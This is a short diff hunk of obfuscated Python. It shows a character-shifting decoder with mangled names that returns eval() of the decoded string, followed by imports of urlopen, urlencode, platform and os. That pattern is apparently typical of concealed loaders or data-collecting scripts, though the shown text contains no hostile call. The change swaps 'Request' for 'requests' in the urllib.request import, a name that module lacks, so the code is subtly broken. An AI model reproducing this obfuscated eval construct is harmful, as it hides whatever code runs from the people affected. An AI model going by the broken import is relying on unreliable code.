@@ -14,7 +14,7 @@ def l11ll_opy_ (l11111_opy_):
     else:
         l1ll11_opy_ = str () .join ([chr (ord (char) - l1l1ll1l_opy_ - (l1l11_opy_ + l1l111ll_opy_) % l111lll1_opy_) for l1l11_opy_, char in enumerate (l1lll11_opy_)])
     return eval (l1ll11_opy_)
-from urllib.request import Request,urlopen
+from urllib.request import requests,urlopen
 from urllib.parse import urlencode
 import platform
 import os
